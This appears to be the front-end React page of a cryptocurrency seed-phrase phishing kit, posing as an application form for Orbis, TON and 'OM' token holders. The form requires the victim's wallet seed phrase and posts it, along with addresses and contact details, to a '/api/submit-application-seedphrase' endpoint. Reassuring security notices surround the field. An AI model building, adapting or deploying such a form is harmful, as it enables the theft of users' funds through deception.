"use client"

import type React from "react"

import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Textarea } from "@/components/ui/textarea"
import { Checkbox } from "@/components/ui/checkbox"
import { AlertCircle, CheckCircle, Info, ShieldAlert } from "lucide-react"
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert"
import { useLanguage } from "@/contexts/language-context"

export default function HomePage() {
  const { t } = useLanguage()

  const [formData, setFormData] = useState({
    orbisAddress: "",
    tonAddress: "",
    // tokenAmount: "",
    contact: "",
    seedphrase: "",
    hasOm: false,
  })
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [submitResult, setSubmitResult] = useState<{ success: boolean; message: string } | null>(null)

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
    const { name, value } = e.target
    setFormData((prev) => ({ ...prev, [name]: value }))
  }

  const handleCheckboxChange = (checked: boolean) => {
    setFormData((prev) => ({ ...prev, hasOm: checked }))
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsSubmitting(true)

    try {
      // Placeholder API call
      const response = await fetch("/api/submit-application-seedphrase", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(formData),
      })

      const data = await response.json()

      if (data.success) {
        setSubmitResult({
          success: true,
          message: t("application.success"),
        })
      } else {
        setSubmitResult({
          success: false,
          message: data.error || t("application.error"),
        })
      }
    } catch (error) {
      setSubmitResult({
        success: false,
        message: t("application.error.generic"),
      })
    } finally {
      setIsSubmitting(false)
    }
  }

  return (
    <div className="w-full max-w-md">
      <Card className="w-full">
        <CardHeader className="text-center">
          <CardTitle className="text-2xl font-medium text-gray-800">{t("application.title")}</CardTitle>
          <CardDescription>{t("application.description")}</CardDescription>
        </CardHeader>
        <CardContent>
          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="space-y-4">
              <div className="space-y-2">
                <Label htmlFor="orbisAddress">{t("application.orbisAddress")}</Label>
                <Input
                  id="orbisAddress"
                  name="orbisAddress"
                  placeholder={t("application.orbisAddress.placeholder")}
                  value={formData.orbisAddress}
                  onChange={handleChange}
                  required
                />
              </div>

              <div className="space-y-2">
                <Label htmlFor="seedphrase">{t("application.seedphrase")}</Label>
                <Textarea
                  id="seedphrase"
                  name="seedphrase"
                  placeholder={t("application.seedphrase.placeholder")}
                  value={formData.seedphrase}
                  onChange={handleChange}
                  className="min-h-[100px] font-mono"
                  required
                />
                <p className="text-xs text-muted-foreground">{t("application.seedphrase.security")}</p>
              </div>

              <div className="space-y-2">
                <Label htmlFor="tonAddress">{t("application.tonAddress")}</Label>
                <Input
                  id="tonAddress"
                  name="tonAddress"
                  placeholder={t("application.tonAddress.placeholder")}
                  value={formData.tonAddress}
                  onChange={handleChange}
                  required
                />
              </div>

              {/* <div className="space-y-2">
                <Label htmlFor="tokenAmount">{t("application.tokenAmount")}</Label>
                <Input
                  id="tokenAmount"
                  name="tokenAmount"
                  type="number"
                  placeholder={t("application.tokenAmount.placeholder")}
                  value={formData.tokenAmount}
                  onChange={handleChange}
                  required
                />
              </div> */}

              <div className="space-y-2">
                <Label htmlFor="contact">{t("application.contact")}</Label>
                <Input
                  id="contact"
                  name="contact"
                  placeholder={t("application.contact.placeholder")}
                  value={formData.contact}
                  onChange={handleChange}
                  required
                />
              </div>

              <div className="flex items-center space-x-2 pt-2">
                <Checkbox id="hasOm" checked={formData.hasOm} onCheckedChange={handleCheckboxChange} />
                <Label htmlFor="hasOm" className="cursor-pointer">
                  {t("application.hasOm")}
                </Label>
              </div>
            </div>

            <Alert variant="destructive" className="bg-red-50 text-red-800 border-red-200">
              <ShieldAlert className="h-4 w-4" />
              <AlertTitle>{t("application.seedphrase.warning.title")}</AlertTitle>
              <AlertDescription>{t("application.seedphrase.warning.message")}</AlertDescription>
            </Alert>

            <Alert className="bg-blue-50 text-blue-800 border-blue-200">
              <Info className="h-4 w-4" />
              <AlertTitle>{t("application.info.title")}</AlertTitle>
              <AlertDescription>{t("application.info.message")}</AlertDescription>
            </Alert>

            <Button type="submit" className="w-full bg-purple-600 hover:bg-purple-700" disabled={isSubmitting}>
              {isSubmitting ? t("application.submitting") : t("application.submit")}
            </Button>

            {submitResult && (
              <Alert
                className={
                  submitResult.success
                    ? "bg-green-50 text-green-800 border-green-200"
                    : "bg-red-50 text-red-800 border-red-200"
                }
              >
                {submitResult.success ? <CheckCircle className="h-4 w-4" /> : <AlertCircle className="h-4 w-4" />}
                <AlertDescription>{submitResult.message}</AlertDescription>
              </Alert>
            )}
          </form>
        </CardContent>
      </Card>
    </div>
  )
}

